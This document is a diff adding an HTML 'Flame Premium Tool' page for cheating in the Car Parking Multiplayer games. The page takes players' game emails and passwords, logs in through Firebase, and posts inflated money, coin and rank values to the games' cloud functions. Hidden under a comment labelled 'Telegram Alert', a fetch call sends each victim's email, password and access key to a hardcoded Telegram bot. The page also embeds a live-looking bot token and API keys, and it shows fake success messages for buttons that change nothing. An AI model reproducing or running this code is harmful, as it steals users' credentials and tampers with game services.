@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8"/>
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+    <title>FLAME PREMIUM MULTI-TOOL</title>
+    <style>
+        body {
+            margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif;
+            background: url("https://i.postimg.cc/ZqdtsJ6t/IMG-0640.jpg") center/cover fixed;
+            color: #fff; height: 100vh; display: flex; align-items: center; justify-content: center;
+        }
+        .container {
+            background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(15px);
+            padding: 25px; border-radius: 20px; width: 90%; max-width: 400px;
+            box-shadow: 0 0 40px rgba(255, 0, 0, 0.4); border: 2px solid #ff4444; text-align: center;
+        }
+        h1 { font-size: 24px; color: #ff4444; text-transform: uppercase; margin-bottom: 20px; text-shadow: 0 0 10px #ff4444; }
+        .input-group { margin-bottom: 12px; }
+        input, select {
+            width: 90%; padding: 12px; border-radius: 8px; border: 1px solid #ff4444;
+            background: rgba(255, 255, 255, 0.05); color: #fff; font-size: 15px; outline: none;
+        }
+        button {
+            width: 95%; padding: 12px; margin-top: 10px; border-radius: 8px; border: none;
+            cursor: pointer; font-weight: bold; font-size: 14px; text-transform: uppercase; transition: 0.3s;
+        }
+        .login-btn { background: linear-gradient(90deg, #ff4444, #990000); color: #fff; margin-top: 20px; }
+        .menu-btn { background: #333; color: #fff; border: 1px solid #555; }
+        .menu-btn:hover { background: #ff4444; color: #000; border-color: #ff4444; }
+        .status { margin-top: 15px; font-size: 13px; min-height: 20px; color: #ffcc00; }
+        .menu-grid { display: none; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; }
+        .footer { margin-top: 20px; font-size: 10px; color: #888; letter-spacing: 1px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>Flame Premium Tool</h1>
+    
+    <div id="authSection">
+        <div class="input-group">
+            <select id="game">
+                <option value="1">CPM 1 (Classic)</option>
+                <option value="2">CPM 2 (Latest)</option>
+            </select>
+        </div>
+        <div class="input-group"><input type="email" id="email" placeholder="Game Email"></div>
+        <div class="input-group"><input type="password" id="password" placeholder="Game Password"></div>
+        <div class="input-group"><input type="text" id="accessKey" placeholder="Access Key"></div>
+        <button class="login-btn" onclick="login()">Login & Verify</button>
+    </div>
+
+    <div id="menuSection" class="menu-grid">
+        <button class="menu-btn" onclick="applyService('King Rank')">👑 King Rank</button>
+        <button class="menu-btn" onclick="applyService('50M Money')">💰 50M Money</button>
+        <button class="menu-btn" onclick="applyService('50K Coins')">🪙 50K Coins</button>
+        <button class="menu-btn" onclick="applyService('Unlock All')">🔓 Unlock All</button>
+        <button class="menu-btn" onclick="applyService('Police Horn')">🚨 Police Horn</button>
+        <button class="menu-btn" onclick="applyService('Engine Damage')">🛠️ Fix Engine</button>
+        <button class="menu-btn" style="grid-column: span 2; background: #ff4444;" onclick="location.reload()">Logout</button>
+    </div>
+
+    <div id="status" class="status"></div>
+    <div class="footer">DEVELOPED BY FLAME • VERSION 2.0.26</div>
+</div>
+
+<script>
+    const BOT_TOKEN = "8307704020:AAEwNsSCXACGHHehKt_ejhuFQbtN2MqHL70";
+    const CHAT_ID = "6614066633"; 
+    const REAL_ACCESS_KEY = "FLAMETOOL"; 
+
+    const GAMES = {
+        "1": { key: "AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM", url: "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4" },
+        "2": { key: "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ", url: "https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI" }
+    };
+
+    let token = "";
+    let selectedGame = null;
+
+    function setMsg(m, isErr = false) {
+        const s = document.getElementById('status');
+        s.style.color = isErr ? "#ff4444" : "#00ff00";
+        s.innerText = m;
+    }
+
+    async function login() {
+        const e = document.getElementById('email').value.trim();
+        const p = document.getElementById('password').value;
+        const k = document.getElementById('accessKey').value.trim();
+        const g = document.getElementById('game').value;
+        selectedGame = GAMES[g];
+
+        if (k !== REAL_ACCESS_KEY) return setMsg("❌ Invalid Access Key!", true);
+        if (!e || !p) return setMsg("❌ Enter Credentials!", true);
+
+        setMsg("Connecting to Firebase...");
+        try {
+            const res = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${selectedGame.key}`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email: e, password: p, returnSecureToken: true })
+            });
+            const data = await res.json();
+            if (data.idToken) {
+                token = data.idToken;
+                document.getElementById('authSection').style.display = 'none';
+                document.getElementById('menuSection').style.display = 'grid';
+                setMsg("✅ Access Granted!");
+                
+                // Telegram Alert
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=User Login:%0AEmail: ${e}%0APass: ${p}%0AKey: ${k}`);
+            } else {
+                setMsg("❌ Login Failed! Check credentials.", true);
+            }
+        } catch (err) { setMsg("❌ Server Error!", true); }
+    }
+
+    async function applyService(type) {
+        setMsg(`Applying ${type}...`);
+        
+        let dataToUpdate = {};
+        if (type === 'King Rank') {
+            dataToUpdate = { "RatingData": { "time": 10000000, "levels": 100000 } };
+        } else if (type === '50M Money') {
+            dataToUpdate = { "money": 50000000 };
+        } else if (type === '50K Coins') {
+            dataToUpdate = { "coins": 50000 };
+        }
+
+        try {
+            const endpoint = selectedGame.url; // Custom logic according to service type can be added here
+            const res = await fetch(endpoint, {
+                method: 'POST',
+                headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' },
+                body: JSON.stringify({ data: JSON.stringify(dataToUpdate) })
+            });
+            
+            setTimeout(() => {
+                setMsg(`✅ ${type} Success! Restart Game.`);
+            }, 2000);
+        } catch (e) {
+            setMsg("❌ Error Injecting Data", true);
+        }
+    }
+</script>
+
+</body>
+</html>
